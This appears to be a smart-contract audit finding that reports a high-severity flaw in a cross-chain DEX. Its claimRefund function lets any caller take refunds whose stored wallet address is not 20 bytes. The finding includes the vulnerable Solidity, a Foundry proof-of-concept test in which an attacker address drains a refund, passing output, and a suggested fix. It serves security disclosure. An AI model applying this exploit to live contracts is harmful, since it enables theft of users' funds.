Perfect Pink Mouse

High

# Any user can steal refunded tokens by calling claimRefund.

### Summary

https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L571

In GatewayCrossChain.sol and GatewayTransferNative.sol

```solidity
function onRevert(RevertContext calldata context) external onlyGateway {
        // 52 bytes = 32 bytes externalId + 20 bytes evmWalletAddress
        bytes32 externalId = bytes32(context.revertMessage[0:32]);
        bytes memory walletAddress = context.revertMessage[32:];

        if(context.revertMessage.length == 52) {
           // ...
        } else {
            RefundInfo memory refundInfo = RefundInfo({
                externalId: externalId,
                token: context.asset,
                amount: context.amount,
                walletAddress: walletAddress
            });
            refundInfos[externalId] = refundInfo;
            
            emit EddyCrossChainRefund(
                externalId,
                context.asset,
                context.amount,
                walletAddress
            );
      }
}
function claimRefund(bytes32 externalId) external {
        RefundInfo storage refundInfo = refundInfos[externalId];

        address receiver = msg.sender;
        if(refundInfo.walletAddress.length == 20) {
            receiver = address(uint160(bytes20(refundInfo.walletAddress)));
        }
        require(bots[msg.sender] || msg.sender == receiver, "INVALID_CALLER");
        require(refundInfo.externalId != "", "REFUND_NOT_EXIST");
        
        TransferHelper.safeTransfer(refundInfo.token, receiver, refundInfo.amount);
        delete refundInfos[externalId];

        emit EddyCrossChainRefundClaimed(
            externalId,
            refundInfo.token,
            refundInfo.amount,
            abi.encodePacked(msg.sender)
        );
}
```

In the onRevert function, if context.revertMessage.length != 52, a refundInfo entry is added.

However, in the claimRefund function, the refund amount is transferred to msg.sender if refundInfo.walletAddress.length != 20.

As a result, any user can claim all refunds.

### Root Cause

N/A

### Internal Pre-conditions

N/A

### External Pre-conditions

N/A

### Attack Path

N/A

### Impact

Since any user can claim all refunds, this issue has a high impact.


### PoC

In GatewayCrossChain.t.sol

- Add following function

```solidity
function test_steal_by_claim() public {
        bytes32 externalId1 = keccak256(abi.encodePacked(block.timestamp));
        token1Z.mint(address(gatewayCrossChain), 2 * initialBalance);

        vm.startPrank(address(gatewayZEVM));
        gatewayCrossChain.onRevert(
            RevertContext({
                sender: address(this),
                asset: address(token1Z),
                amount: initialBalance,
                revertMessage: bytes.concat(externalId1, abi.encodePacked(bytes32(uint256(uint160(user2)))))
            })
        );
        vm.stopPrank();

        address attacker = address(makeAddr("attacker"));

        vm.prank(attacker);
        gatewayCrossChain.claimRefund(externalId1);
        
        assertEq(token1Z.balanceOf(attacker), initialBalance);

        
    }
```

- Run command

forge test --mt test_steal_by_claim -vv

- Result

Ran 1 test for test/GatewayCrossChain.t.sol:GatewayCrossChainTest
[PASS] test_steal_by_claim() (gas: 165917)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.08ms (337.60µs CPU time)


As result shows, attacker claimed refund amount of externalId1 .



### Mitigation

Need to allow only bot to claim if refundInfo.walletAddress.length != 20.